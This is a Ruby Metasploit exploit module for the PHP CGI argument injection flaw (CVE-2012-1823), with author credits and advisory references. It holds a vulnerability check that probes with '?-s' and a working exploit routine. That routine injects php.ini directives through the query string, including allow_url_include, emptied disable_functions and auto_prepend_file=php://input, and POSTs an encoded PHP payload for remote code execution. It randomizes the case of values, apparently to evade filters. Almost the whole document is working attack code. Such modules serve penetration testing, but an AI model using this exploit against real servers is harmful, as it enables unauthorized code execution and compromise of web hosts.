
class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'PHP CGI Argument Injection',
			'Description'    => %q{
				When run as a CGI, PHP up to version 5.3.12 and 5.4.2 is vulnerable to
				an argument injection vulnerability.  This module takes advantage of
				the -d flag to set php.ini directives to achieve code execution.
				From the advisory: "if there is NO unescaped '=' in the query string,
				the string is split on '+' (encoded space) characters, urldecoded,
				passed to a function that escapes shell metacharacters (the "encoded in
				a system-defined manner" from the RFC) and then passes them to the CGI
				binary."
			},
			'Author'         => [ 'egypt', 'hdm' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     => [
					[ 'CVE'	, '2012-1823' ],
					[ 'OSVDB', '81633'],
					[ 'URL'	, 'http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/' ],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					# Arbitrary big number. The payload gets sent as an HTTP
					# response body, so really it's unlimited
					'Space'       => 262144, # 256k
				},
			'DisclosureDate' => 'May 03 2012',
			'Platform'       => 'php',
			'Arch'           => ARCH_PHP,
			'Targets'        => [[ 'Automatic', { }]],
			'DefaultTarget' => 0))

		register_options([
			OptString.new('TARGETURI', [false, "The URI to request (must be a CGI-handled PHP script)"]),
			], self.class)
	end

	# php-cgi -h
	# ...
	#   -s               Display colour syntax highlighted source.
	def check
		uri = target_uri.path

		uri.gsub!(/\?.*/, "")

		print_status("Checking uri #{uri}")

		response = send_request_raw({ 'uri' => uri })

		if response and response.code == 200 and response.body =~ /\<code\>\<span style.*\&lt\;\?/mi
			print_error("Server responded in a way that was ambiguous, could not determine whether it was vulnerable")
			return Exploit::CheckCode::Unknown
		end

		response = send_request_raw({ 'uri' => uri + '?-s'})
		if response and response.code == 200 and response.body =~ /\<code\>\<span style.*\&lt\;\?/mi
			return Exploit::CheckCode::Vulnerable
		end

		print_error("Server responded indicating it was not vulnerable")
		return Exploit::CheckCode::Safe
	end

	def exploit
		begin
			args = [
				"-d+allow_url_include%3d#{rand_php_ini_true}",
				"-d+safe_mode%3d#{rand_php_ini_false}",
				"-d+suhosin.simulation%3d#{rand_php_ini_true}",
				"-d+disable_functions%3d%22%22",
				"-d+open_basedir%3dnone",
				"-d+auto_prepend_file%3dphp://input",
				"-n"
			]

			qs = args.join("+")
			uri = "#{target_uri}?#{qs}"

			# Has to be all on one line, so gsub out the comments and the newlines
			payload_oneline = "<?php " + payload.encoded.gsub(/\s*#.*$/, "").gsub("\n", "")
			response = send_request_cgi( {
				'method' => "POST",
				'global' => true,
				'uri'    => uri,
				'data'   => payload_oneline,
			}, 0.5)
			handler

		rescue ::Interrupt
			raise $!
		rescue ::Rex::HostUnreachable, ::Rex::ConnectionRefused
			print_error("The target service unreachable")
		rescue ::OpenSSL::SSL::SSLError
			print_error("The target failed to negotiate SSL, is this really an SSL service?")
		end

	end

	def rand_php_ini_false
		Rex::Text.to_rand_case([ "0", "off", "false" ][rand(3)])
	end

	def rand_php_ini_true
		Rex::Text.to_rand_case([ "1", "on", "true" ][rand(3)])
	end

end

